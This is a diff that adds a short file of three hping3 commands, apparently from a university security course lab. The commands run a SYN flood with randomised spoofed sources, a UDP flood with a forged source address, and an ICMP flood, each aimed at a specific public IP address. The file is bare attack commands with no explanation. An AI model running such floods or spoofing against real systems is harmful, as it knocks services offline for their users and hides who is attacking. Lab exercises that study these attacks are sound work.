@@ -1,0 +1,5 @@
+1) root@comp3134-junyangan:/var/www/html# hping3 -S 178.128.237.247 -c 10000 --rand-source
+
+2) root@comp3134-junyangan:/var/www/html# hping3 --udp --spoof 111.111.111.111 -t 90 -c 9000 178.128.237.247
+
+3) hping3 --icmp -c 11000 -i u75000 --data 1 178.128.237.247
